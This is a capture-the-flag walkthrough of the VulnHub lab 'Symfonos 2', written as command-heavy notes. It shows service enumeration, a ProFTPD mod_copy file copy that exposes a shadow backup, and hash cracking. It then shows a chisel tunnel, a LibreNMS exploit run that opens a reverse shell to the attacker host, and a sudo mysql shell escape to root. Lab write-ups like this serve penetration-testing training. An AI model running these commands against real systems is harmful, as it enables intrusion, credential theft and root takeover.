# Recon

## TCP/21 - FTP
### NMAP Scan
```
┌──(root💀kali)-[~/vulnHub/Symfonos-2]
└─# nmap -vv --reason -Pn -T4 -sV -p 21 "--script=banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)"

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.5
| banner: 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.16
|_8.236.7]
MAC Address: 08:00:27:BB:18:ED (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix
```
- `ProFTPD 1.3.5` 
	- Exploited before @ TryHackMe: Kenobi
- Anonymous access denied

## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/Symfonos-2]
└─# ffuf -u http://192.168.236.7/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.sql,.php'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.236.7/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .sql .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 183, Words: 18, Lines: 15]
index.html              [Status: 200, Size: 183, Words: 18, Lines: 15]
:: Progress: [23075/23075] :: Job [1/1] :: 5603 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
- `index.html`
### Nikto
```
┌──(root💀kali)-[~/vulnHub/Symfonos-2]
└─#     nikto -ask=no -h http://192.168.236.7:80 2>&1 | tee "/root/vulnHub/Symfonos-2/192.168.236.7/scans/tcp80/tcp_80_http_nikto.txt"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.236.7
+ Target Hostname:    192.168.236.7
+ Target Port:        80
+ Start Time:         2022-01-23 23:50:07 (GMT8)
---------------------------------------------------------------------------
+ Server: webfs/1.21
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7916 requests: 1 error(s) and 3 item(s) reported on remote host
+ End Time:           2022-01-23 23:50:35 (GMT8) (28 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
- `webfs/1.21`

## TCP/139,445 - SMB
### Enum4linux
```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
	S-1-22-1-1000 Unix User\aeolus (Local User)
	S-1-22-1-1001 Unix User\cronus (Local User)
```
- `aeolus`
- `cronus`
### Crackmapexec + SMBMap
```
┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/exploit]
└─# crackmapexec smb $ip -u '' -p '' --shares
SMB         192.168.236.7   445    SYMFONOS2        [*] Windows 6.1 (name:SYMFONOS2)
SMB         192.168.236.7   445    SYMFONOS2        [+] \: 
SMB         192.168.236.7   445    SYMFONOS2        [+] Enumerated shares
SMB         192.168.236.7   445    SYMFONOS2        Share           Permissions   
SMB         192.168.236.7   445    SYMFONOS2        -----           -----------   
SMB         192.168.236.7   445    SYMFONOS2        print$                      
SMB         192.168.236.7   445    SYMFONOS2        anonymous       READ            
SMB         192.168.236.7   445    SYMFONOS2        IPC$                           Service (Samba 4.5.16-Debian)

┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/exploit]
└─# smbmap -H $ip
[+] Guest session   		  IP: 192.168.236.7:445   Name: unknown         
	Disk                                                Permissions		Comment
	----                                                -----------		-------
	print$                                              NO ACCESS		Printer 
	anonymous                                           READ ONLY	
	IPC$                                                NO ACCESS		IPC Service (Samba 4.5.16-Debian)
```
- `anonymous`, READ ONLY

# Initial Foothold
## TCP/80 - HTTP - No Exploits
1. Proceed to `/index.html`
	![](images/Pasted%20image%2020220124000017.png)
	
## TCP/139,445 - SMB
1. Download all files recursively
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb]
	└─# smbclient //$ip/anonymous -c 'prompt;recurse;mget *'
	Enter WORKGROUP\root's password: 
	getting file \backups\log.txt of size 11394 as backups/log.txt (1112.7 KiloBytes/sec) (average 1112.7 KiloBytes/sec)
	┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb]
	└─# ls
	backups
	```
2. View `backup/log.txt`
	![](images/Pasted%20image%2020220124001100.png)
	- `/var/backups/shadow.bak`
	- `/home/aeolus/share`

## TCP/21 - FTP - ProFTPD 1.3.5 File Copy 
1. Search exploits for `ProFTPD 1.3.5`
	```
	-----------------------------------------------------------------------------------
	Exploit Title						   |  Path		  
	----------------------------------------------------------------------------------- 
	ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)  | linux/remote/37262.rb
	ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution        | linux/remote/36803.py
	ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)    | linux/remote/49908.py
	ProFTPd 1.3.5 - File Copy 				   | linux/remote/36742.txt
	```
	- `RCE` requires us to have access to a directory
2. Use `ProFTPd 1.3.5 - File Copy `
	![](images/Pasted%20image%2020220124002839.png)
3. Exploit
	1. Copy `/var/backups/shadow.bak` to `/home/aeolus/share` (anonymous share)
		```
		┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/exploit]
		└─# telnet $ip 21
		Trying 192.168.236.7...
		Connected to 192.168.236.7.
		Escape character is '^]'.
		220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.236.7]
		site cpfr /var/backups/shadow.bak
		350 File or directory exists, ready for destination name
		site cpto /home/aeolus/share/shadow.bak
		250 Copy successful
		```
		![](images/Pasted%20image%2020220124003535.png)
	2. Download `shadow.bak`
		```
		┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb]
		└─# smbclient //$ip/anonymous 
		Enter WORKGROUP\root's password: 
		Try "help" to get a list of possible commands.
		smb: \> get shadow.bak 
		getting file \shadow.bak of size 1173 as shadow.bak (572.7 KiloBytes/sec) (average 572.8 KiloBytes/sec)
		smb: \> 
		```
4. Extract hashes
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb]
	└─# cat shadow.bak | cut -d ":" -f2 | sed 's/*\|!/ /g' | awk 'NF'
	$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.
	$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.
	$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/
	```
	- `sha512crypt (1800)`
5. Crack hashes
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb]
	└─# hashcat -a 0 -m 1800 hashes /usr/share/wordlists/rockyou.txt --show
	$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:sergioteamo
	
	┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb]
	└─# cat shadow.bak | grep -i mlg
	aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
	```
	- aeolus:sergioteamo

## TCP/22 - SSH 
1. SSH w/ aeolus:sergioteamo
	![](images/Pasted%20image%2020220124004559.png)


# Privilege Escalation
## Cronus - Via LibreNMS CMS Authenticated RCE 
1. Ran linpeas
	![](images/Pasted%20image%2020220124014537.png)
	- `127.0.0.1:8080`
	- `apache2` running as `cronus`
2. Open up the internal service w/ Chisel
	1. Kali
		```
		┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb]
		└─# chisel server --reverse --port 1337
		2022/01/24 00:59:48 server: Reverse tunnelling enabled
		2022/01/24 00:59:48 server: Fingerprint zUwTnSwJD7AhStYF+Mrpe5iyr4aIGUEHlvhXnP7dGhk=
		2022/01/24 00:59:48 server: Listening on http://0.0.0.0:1337
		2022/01/24 01:00:31 server: session#1: Client version (1.7.6) differs from server version (0.0.0-src)
		2022/01/24 01:00:31 server: session#1: tun: proxy#R:8888=>8080: Listening
		```
	2. Target
		```
		aeolus@symfonos2:~$ ./chiselLinux64 client 192.168.236.4:1337 R:8888:127.0.0.1:8080 &
		[1] 2242
		
		aeolus@symfonos2:~$ 2022/01/23 19:00:31 client: Connecting to ws://192.168.236.4:1337
		2022/01/23 19:00:31 client: Connected (Latency 1.756904ms)
		```
3. Proceed to  `localhost:8888`, login w/ aeolus:sergioteamo
	![](images/Pasted%20image%2020220124015106.png)
4. Search exploits for `LibreNMS`
	- https://shells.systems/librenms-v1-46-remote-code-execution-cve-2018-20434/
	- `php/webapps/47044.py`
	- https://www.exploit-db.com/exploits/47044
5. Obtain Cookies
	```
	"XSRF-Token=; librenms_session=; PHPSESSID="
	```
	![](images/Pasted%20image%2020220124021230.png)
6. Exploit
	```
	[!] Usage : ./exploit.py http://www.example.com cookies rhost rport
	
	┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/exploit]
	└─# python 47044.py http://localhost:8888 "XSRF-Token=eyJpdiI6InVYMkhsU3FqQ09NZ2xCeFd4N3RuTEE9PSIsInZhbHVlIjoiS2pmejIzc3lBOVhWallPZlpYQ1J6MzI5YUptQ1pQWFpaWndCdUZDOUV1R0h6bVoyaGZsZnh3RmFVNlZcL25rZ1hYaVQwY01obkg0YUtPTG9MKzRqZVN3PT0iLCJtYWMiOiI0NzVmYmFjNjBhZjI4NDM5YWNiMzY3MTA4ZjE1YzhlNWQxMzY0ODcyMWIwNDkxNmFmZmZiZjg0ODM1MzJlMTA4In0%3D; librenms_session=eyJpdiI6IjV4N1RUR1wveVBBUjliNlRnQWsxdElBPT0iLCJ2YWx1ZSI6ImNWRkN3VnBEbG16eE92bTU1aVBoVEFhQnBnMm5QamEyWWJ3YVV3MzZIY0VOMGxJR3BGN0tVMno0SVVkMmJQaGxPalJNaHJXQU5PK2dhQ0Z4RkxabEJRPT0iLCJtYWMiOiIwOGE1NDQ1MTY3YjJlMGVmZTg5NzZkYWNjYzE1OGZmYmRjMTRlZDU4YTE2MmU5NTNlMjljM2I2MzNjN2RiM2E0In0%3D; PHPSESSID=9e807k9im9sjtqtp5408c58qj4" 192.168.236.4 4444
	[+] Device Created Sucssfully

	┌──(root💀kali)-[~/vulnHub/Symfonos-2]
	└─# nc -nvlp 4444
	Ncat: Version 7.92 ( https://nmap.org/ncat )
	Ncat: Listening on :::4444
	Ncat: Listening on 0.0.0.0:4444
	Ncat: Connection from 192.168.236.7.
	Ncat: Connection from 192.168.236.7:46838.
	/bin/sh: 0: can't access tty; job control turned off
	$ whoami; id
	cronus
	uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
	```
	![](images/Pasted%20image%2020220124020916.png)
	
## Root - Via Sudo GTFO Bin
1. Check sudo access
	```
	cronus@symfonos2:/opt/librenms/html$ sudo -l
	Matching Defaults entries for cronus on symfonos2:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User cronus may run the following commands on symfonos2:
		(root) NOPASSWD: /usr/bin/mysql
	cronus@symfonos2:/opt/librenms/html$ 
	```
	- [mysql has a GTFO Bin entry](https://gtfobins.github.io/gtfobins/mysql/#sudo)
2. Exploit
	```
	sudo /usr/bin/mysql -e '\! /bin/sh'
	```
3. Root shell obtained
	```
	cronus@symfonos2:/opt/librenms/html$ sudo /usr/bin/mysql -e '\! /bin/sh'
	# whoami
	root
	# cd /root
	# ls
	proof.txt
	# cat proof.txt

		Congrats on rooting symfonos:2!

			   ,   ,
			 ,-`{-`/
		  ,-~ , \ {-~~-,
		,~  ,   ,`,-~~-,`,
	  ,`   ,   { {      } }                                             }/
	 ;     ,--/`\ \    / /                                     }/      /,/
	;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
	; /   `       } } `, `-`-.___                            / `,  ,/  `,/
	 \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
	  `        { {                                     __  /  ,`/   ,`,;
			/   \ \                                 _,`, `{  `,{   `,`;`
		   {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
		   \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
			`-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
					   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
					/~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
		   /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
		  /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
		 / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
		/ , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
	  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
	/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,

		Contact me via Twitter @zayotic to give feedback!

	```
	![](images/Pasted%20image%2020220124022026.png)


---
Tags: #tcp/22-ftp/exploit #pivot #tcp/80-http/web-app-cms-exploit #linux-priv-esc/sudo/gtfo-bin 

---
